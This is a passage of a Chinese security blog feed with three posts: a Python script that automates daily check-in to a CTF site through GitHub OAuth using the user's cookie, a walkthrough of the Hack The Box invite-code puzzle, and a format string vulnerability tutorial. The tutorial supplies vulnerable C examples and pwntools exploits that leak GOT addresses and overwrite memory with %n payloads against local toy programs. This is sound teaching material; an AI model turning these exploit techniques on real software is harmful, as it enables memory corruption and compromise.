class="title">login_status</span>(<span class="params">user_line, server_line,res</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;登录成功&quot;</span> <span class="keyword">in</span> res.text):</span><br><span class="line">        print(<span class="string">&quot;cookie提取成功!&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&#x27;,&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;PHPSESSID&#x27;</span> <span class="keyword">in</span> i):</span><br><span class="line">                login_result(user_line, server_line, i.strip())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#主函数</span></span><br><span class="line"><span class="meta">@retry(stop_max_attempt_number=3)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_fun</span>(<span class="params">user_line, server_line, git_line</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    keep = requests.Session()</span><br><span class="line">    div = BeautifulSoup(keep.get(<span class="string">&quot;https://ctf.bugku.com/login&quot;</span>.rstrip(), headers=headers, verify=<span class="literal">False</span>).text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    git_url = div.find(<span class="string">&#x27;a&#x27;</span>, class_=<span class="string">&#x27;btn btn-floating btn-github&#x27;</span>)[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">    git_cookie = <span class="string">&#x27;user_session=&#123;git_line1&#125;; __Host-user_session_same_site=&#123;git_line2&#125;;&#x27;</span>.format(git_line1=git_line, git_line2=git_line )</span><br><span class="line">    headers[<span class="string">&#x27;cookie&#x27;</span>] = git_cookie</span><br><span class="line">    flag = keep.get(<span class="string">&quot;https://github.com/settings/profile&quot;</span>, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span>(flag.status_code!= <span class="number">200</span>):</span><br><span class="line">        server_send(user_line, server_line, <span class="string">&quot;github的cookie失效了噢！&quot;</span>)</span><br><span class="line">    res = keep.get(git_url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">    login_status(user_line,server_line, res)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;github.githubassets.com&quot;</span> <span class="keyword">in</span> res.text):</span><br><span class="line">        print(res.text)</span><br><span class="line">        choose = res.text.split(<span class="string">&#x27;&lt;form action=&quot;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;scope&quot;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        rule = re.compile(<span class="string">&#x27;name=&quot;(.*?)&quot;.*?value=&quot;(.*?)&quot;&#x27;</span>)</span><br><span class="line">        form_data = rule.findall(choose)</span><br><span class="line">        Data = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> form_data:</span><br><span class="line">            Data[i[<span class="number">0</span>]] = i[<span class="number">1</span>]</span><br><span class="line">        Data[<span class="string">&#x27;authorize&#x27;</span>] = <span class="number">1</span></span><br><span class="line">        formurl = <span class="string">&quot;https://github.com&quot;</span> + choose.split(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">            <span class="string">&quot;cookie&quot;</span>: git_url</span><br><span class="line">        &#125;</span><br><span class="line">        res = keep.post(formurl, data=Data, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">        login_status(user_line,server_line, res)</span><br><span class="line">    <span class="keyword">elif</span>(<span class="string">&quot;登录成功&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text):</span><br><span class="line">        server_send(user_line, server_line, <span class="string">&quot;超时错误&quot;</span>)</span><br><span class="line">    keep.cookies.clear()</span><br><span class="line">    keep.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    user_list, server_list, git_list = load_txt()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(user_list)):</span><br><span class="line">        main_fun(user_list[i], server_list[i], git_list[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在脚本同一个目录下，创建一个配置文件：配置.txt，然后按下面格式分别写入（支持写入多个用户）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user&#x3D;你的用户名# server_key&#x3D;填写你的server酱# git_cookie&#x3D;填写抓包获得的githubcookie#</span><br><span class="line">******author:dota_st******</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku%E7%AD%BE%E5%88%B0%E7%A8%8B%E5%BA%8F/QLT33%29NA~Z9%28E%24%5D597V6Y%5B9.png" alt=""><br>
最后我打包成exe文件，发到我的服务器上（没有服务器的也可以找一下提供云函数的在线平台），设置计划任务，每天固定时间启动，最好设置启动两次，虽然脚本已经尽可能在错误时重试，但因为github这边通道不是很稳定，有可能会出现失败的情况(虽然概率极小)<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku%E7%AD%BE%E5%88%B0%E7%A8%8B%E5%BA%8F/9%244%25S64%404MD%24%40PLXQYMYV_Q.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku%E7%AD%BE%E5%88%B0%E7%A8%8B%E5%BA%8F/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210126165907.jpg" alt=""></p>
]]></content>
      <tags>
        <tag>程序</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack The Box账号注册</title>
    <url>/posts/33946/</url>
    <content><![CDATA[<h2 id="引言"><a class="header-anchor" href="#引言">¶</a>引言</h2>
<p>hack the box 是一个很有趣也很强大的网站，开始接触的时候就被里面的元素给吸引到了，同时，网站的注册也是让人能忍不住动手去探索一下，下面分享一下过程。</p>
<h2 id="正文"><a class="header-anchor" href="#正文">¶</a>正文</h2>
<p>打开网站注册的时候，提示需要自己入侵网站获取注册</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/psc.png" alt=""></p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/13.jpg" alt=""></p>
<p>在下面的clickhere提示我们需要打开控制台查看，于是打开控制台，发现一个可疑的js文件，js文件带有inviteapi名字</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/132165.png" alt=""></p>
<p>跑去查看js文件源码</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/894.png" alt=""></p>
<p>发现function，console，log等关键字，可以猜测后面makeInviteCode是一个方法，需要我们在控制台打印，然后我们溜去控制台试试~</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/165123.png" alt=""></p>
<p>给出一串数据，还提示我们是rot13密文加密方式，于是我们去解解看</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string  </span><br><span class="line"> </span><br><span class="line">upperdict = &#123;&#125;  </span><br><span class="line">lowerdict = &#123;&#125;  </span><br><span class="line">upperletters =string.ascii_uppercase</span><br><span class="line">lowerletters =string.ascii_lowercase<span class="comment">#：所有小写字母</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">dststr = []  </span><br><span class="line">oristr = input(<span class="string">&#x27;Enter string to rot13:&#x27;</span>)<span class="comment">#版本3.0不能用raw_input</span></span><br><span class="line">print(<span class="string">&#x27;Your string ro en/crypt was :&#x27;</span>,oristr ) </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(lowerletters)):                       <span class="comment">#把所有小写字母转为rot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i<span class="number">-13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(upperletters)):                       <span class="comment">#把所有大写字母转为rot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i<span class="number">-13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> oristr:  </span><br><span class="line">	<span class="keyword">if</span> ch <span class="keyword">in</span> lowerdict:  </span><br><span class="line">		dststr.append(lowerdict[ch])  </span><br><span class="line">	<span class="keyword">elif</span> ch <span class="keyword">in</span> upperdict:  </span><br><span class="line">		dststr.append(upperdict[ch])  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		dststr.append(ch)  </span><br><span class="line">dststr = <span class="string">&#x27;&#x27;</span>.join(dststr)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">print(<span class="string">&#x27;the rot13 string is:&#x27;</span>,dststr ) </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/sff2132.png" alt=""></p>
<p><strong>解密结果：</strong></p>
<p>In order to generate the invite code, make a POST request to /api/invite/generate</p>
<p>要想获得注册邀请码，必须使用post方式向此处地址发送请求获取，于是我们马不停蹄得溜去发送请求~~</p>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/1231321.png" alt=""></p>
<p>返回一段被base64方式加密的密文，我们再次跑去解密base64</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str=<span class="string">&quot;SElNRFctSURTRUwtQkZUVEQtTFBJUkQtSFlTWUI=&quot;</span></span><br><span class="line"></span><br><span class="line">temp = base64.b64decode(str)</span><br><span class="line"></span><br><span class="line">print(temp.decode())</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/12315131.png" alt=""></p>
<p>这下子看起来没有问题了，我们可以愉快的拿着邀请码去注册了！！！</p>
]]></content>
  </entry>
  <entry>
    <title>pwn新手入门之格式化字符串漏洞</title>
    <url>/posts/17489/</url>
    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
<p>继续来跟着  <a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">CTF WIKI</a> 来学习格式化字符串漏洞</p>
<h2 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h2>
<p>格式化字符串函数是将计算机内存中表示的数据转化为我们人类可读的字符串格式，可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。</p>
<p><strong>常见的格式化字符串函数</strong></p>
<table>
<thead>
<tr>
<th>函数</th>
<th>基本介绍</th>
</tr>
</thead>
<tbody>
<tr>
<td>printf</td>
<td>输出到 stdout</td>
</tr>
<tr>
<td>fprintf</td>
<td>输出到指定 FILE 流</td>
</tr>
<tr>
<td>vprintf</td>
<td>根据参数列表格式化输出到 stdout</td>
</tr>
<tr>
<td>vfprintf</td>
<td>根据参数列表格式化输出到指定 FILE 流</td>
</tr>
<tr>
<td>sprintf</td>
<td>输出到字符串</td>
</tr>
<tr>
<td>snprintf</td>
<td>输出指定字节数到字符串</td>
</tr>
<tr>
<td>vsprintf</td>
<td>根据参数列表格式化输出到字符串</td>
</tr>
<tr>
<td>vsnprintf</td>
<td>根据参数列表格式化输出指定字节到字符串</td>
</tr>
<tr>
<td>setproctitle</td>
<td>设置 argv</td>
</tr>
<tr>
<td>syslog</td>
<td>输出日志</td>
</tr>
<tr>
<td>err, verr, warn, vwarn 等</td>
<td>。。。</td>
</tr>
</tbody>
</table>
<p>以下图为例<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/printf.png" alt=""></p>
<p>print 函数会按照这个形式<code>Color %s, Number %d, Float %4.2f</code>去解析对应的其他参数</p>
<blockquote>
<p>%d : 十进制 - 输出十进制整数</p>
<p>%s : 字符串 - 从内存中读取字符串</p>
<p>%x : 十六进制 - 输出十六进制数</p>
<p>%c : 字符 - 输出字符</p>
<p>%p : 指针 - 指针地址</p>
<p>%n : 到目前为止所写的字符数</p>
</blockquote>
<p>那么怎么造成格式化字符串漏洞呢？继续以上面的例子为例，当 print 函数没有参数时，即</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printf(&quot;Color %s, Number %d, Float %4.2f&quot;)</span><br></pre></td></tr></table></figure>
<p>程序会继续运行，但是当运行到<code>%s</code>时，如果提供了一个不可访问的地址或者受保护的地址，那么程序会因此而崩溃。</p>
<h2 id="泄露内存"><a class="header-anchor" href="#泄露内存">¶</a>泄露内存</h2>
<h3 id="泄露栈内存"><a class="header-anchor" href="#泄露栈内存">¶</a>泄露栈内存</h3>
<p>我们以一个程序为例</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie example1.c -o example1</span><br></pre></td></tr></table></figure>
<p>使用 gdb 进行调试，在 printf 函数下断点，然后运行，我们传入<code>%08x.%08x.%08x</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/1%5B%5BG%29%60O%40E9MK7%29%24LB5%25_V%60C.png" alt=""><br>
接着我们看一下栈空间<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/8%7BL%5D6_%40LBBDJGY%7BU6PDI%29NH.png" alt=""><br>
第一个<code>%08x</code>解析的是 0x1 (代码中的a)，第二个<code>%08x</code>解析的是<code>0x22222222</code>(代码中的b)，第三个<code>%08x</code>解析的是 -1，接着后面的<code>%s</code>把我们的输入都打印出来，即<code>%08x.%08x.%08x</code><br>
我们继续输入 c 运行程序<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/8JL9QPDD5ZU45%60W002XXFH8.png" alt=""><br>
可以看见程序在到第二个 printf 函数时中断了，因为第二个 printf 函数我们没有传递参数。但程序会在栈上寻找临近的三个参数根据格式化字符串打印出来，如此会把后面三个栈上的值都输出<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/%28BXAV9F%7D4EQMN9%7BDI4FNQ_Q.png" alt=""><br>
这样就会造成栈内存泄露，但上面的例子都是获取临近内容，我们可以使用<code>%n$p</code>来获取第n个参数内容，例如输入<code>%2$p</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/O%24EABUQPIW32%28HYGLLHJB%28E.png" alt=""><br>
打印出相对于格式化字符串的第二个参数对应的值<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E7%90%86/TUZ1%7B%7D%5BVJ_6830%24%60B8%28%28O5T.png" alt=""></p>
<p><strong>小技巧总结</strong></p>
<blockquote>
<ol>
<li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li>
<li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li>
<li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li>
</ol>
</blockquote>
<h3 id="泄露任意地址内存"><a class="header-anchor" href="#泄露任意地址内存">¶</a>泄露任意地址内存</h3>
<p>上述讲了泄露栈上的变量值，下面讲如何泄露变量的地址。如果我们知道格式化字符串在输出函数调用时是第几个参数，就可以通过<code>addr%k$s</code>的办法来获取指定地址 addr 的内容（这里的 k 指第 k 个参数）<br>
我们可以通过如下形式进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaa%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98/7021GVY_U%5DLJ5B%60WMFWN80U.png" alt=""><br>
可以看到 aaaa 对应的 0x61616161 在第四个位置上，也就是格式化字符串的第四个参数，我们知道是第几个参数之后就可以用<code>aaaa%4$p</code>来指定，如果这里我们传的是某个函数的got地址，那么就可以打印出函数在内存中的真实地址<br>
我们使用<code>objdump -R example1</code>来查看该程序got表<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98/3%405HHY9%25Y9S%40%2901M1%5BL%25W%60W.png" alt=""><br>
我们以 scanf 为例，写exp打印 scanf 函数的真实地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./example1&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./example1&quot;</span>)</span><br><span class="line">elf_got = elf.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]</span><br><span class="line">payload = p32(elf_got) + <span class="string">&quot;%4$s&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;%4$s\n&#x27;</span>)</span><br><span class="line">success(hex(u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>])))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="覆盖内存"><a class="header-anchor" href="#覆盖内存">¶</a>覆盖内存</h2>
<h3 id="覆盖栈内存"><a class="header-anchor" href="#覆盖栈内存">¶</a>覆盖栈内存</h3>
<p>覆盖栈内存我们一般用到的是<code>%n</code>，只要变量对应地址可写，我们就可以通过格式化字符串来改变其对应的值<br>
利用步骤如下</p>
<blockquote>
<p>1、确定覆盖地址<br>
2、确定相对偏移<br>
3、进行覆盖</p>
</blockquote>
<p>我们继续以一个程序为例</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified a for a small number.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译程序：<code>gcc -m32 -fno-stack-protector -no-pie example2.c -o example2</code><br>
我们可以通过之前说的办法来确定相对偏移，可以看到是格式化字符串的第六个参数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98/H%7B5KY%29Q%5DF73Y_%7BON486%24LCH.png" alt=""><br>
首先，例如我们知道 <strong>c</strong> 的地址为<code>0xffc25b0c</code>，为4字节，要想满足<code>if (c == 16)</code>还需要12个字节<br>
编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./example2&quot;</span>)</span><br><span class="line">c_addr = int(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">success(hex(c_addr))</span><br><span class="line">payload = p32(c_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + <span class="string">&#x27;%6$n&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98/M1TR56VM%5BGHTG%40I%5BFX4QQSA.png" alt=""><br>
成功进入第一个if判断</p>
<h3 id="覆盖任意地址内存"><a class="header-anchor" href="#覆盖任意地址内存">¶</a>覆盖任意地址内存</h3>
<h4 id="覆盖小数字"><a class="header-anchor" href="#覆盖小数字">¶</a>覆盖小数字</h4>
<p>这里需要我们从4字节(32位程序地址是4字节)变成2字节，也就是覆盖成小数字。如果像我们之前的做法，把地址放在前面，后面无论加什么都是比4大于的数，所以我们换成另一种策略，即使用<code>aa%k$nxx</code>的形式（这里xx是要补齐，32位程序中必须是4的倍数）</p>
<p>我们前面已经知道相对偏移是第六，也就是这里<code>aa%k</code>是第六个参数，而后面的<code>$nxx</code>需要往后加一也就是第七个参数，再加上我们想要修改的地址<code>addr</code>就是第八个参数，所以我们 k 要取 8，exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./example2&quot;</span>)</span><br><span class="line">a_addr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>上面 a 的地址可以去 ida 中查看<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98/V975D7%5D%5B8XKYL_OJ%7BU%5B4XR2.png" alt=""></p>
<h4 id="覆盖大数字"><a class="header-anchor" href="#覆盖大数字">¶</a>覆盖大数字</h4>
<p>接下来到覆盖大数字，按照前面的办法我们可以一次性输出大数字字节来进行覆盖，但是这样基本不会成功，因为太长了，所以我们需要另辟蹊径。首先我们需要了解一下变量在内存中的存储格式</p>
<blockquote>
<p>首先，所有的变量在内存中都是以字节进行存储的。<br>
此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。</p>
</blockquote>
<p>所以我们想要覆盖成<code>0x12345678</code>，需要依次为<code>\ x78\x56\x34\x12</code><br>
接下来我们需要利用到以下字符串格式标志</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hhn : 写入一字节</span><br><span class="line">hn  : 写入两字节</span><br><span class="line">l   : 写入四节写</span><br><span class="line">ll  : 写入八字节</span><br></pre></td></tr></table></figure>
<p>也就是我们需要使用 hhn 一个字节来逐次写入，再配合<code>%nx</code>会返回16进制数来构造exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./example2&quot;</span>)</span><br><span class="line">b_addr = <span class="number">0x0804A028</span></span><br><span class="line">payload1 = p32(b_addr) + p32(b_addr+<span class="number">1</span>) + p32(b_addr+<span class="number">2</span>) + p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;%104x&#x27;</span> + <span class="string">&#x27;%6$hhn&#x27;</span> + <span class="string">&#x27;%222x&#x27;</span> + <span class="string">&#x27;%7$hhn&#x27;</span> + <span class="string">&#x27;%222x&#x27;</span> + <span class="string">&#x27;%8$hhn&#x27;</span> + <span class="string">&#x27;%222x&#x27;</span> + <span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line">payload = payload1 + payload2</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>解析：payload1加起来是16字节，16+104 =120，120转成16进制就是78，120+222=342,342转成16进制就是156，取一字节56，后面依次类推</p>
<p>这里 pwntools 自带了一个好用的函数<code>fmtstr_payload</code>，exp可以简化为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./example2&quot;</span>)</span><br><span class="line">b_addr = <span class="number">0x0804A028</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;<span class="number">0x804A028</span>:<span class="number">0x12345678</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98/%40%5B16N9QHF8S%7BYGAF32%7BOF03.png" alt=""></p>
<h2 id="格式化字符串盲打"><a class="header-anchor" href="#格式化字符串盲打">¶</a>格式化字符串盲打</h2>
<h3 id="fmt-blind-stack"><a class="header-anchor" href="#fmt-blind-stack">¶</a>fmt_blind_stack</h3>
<p>原理是在栈上，不断地去读数据就能得到 flag</p>
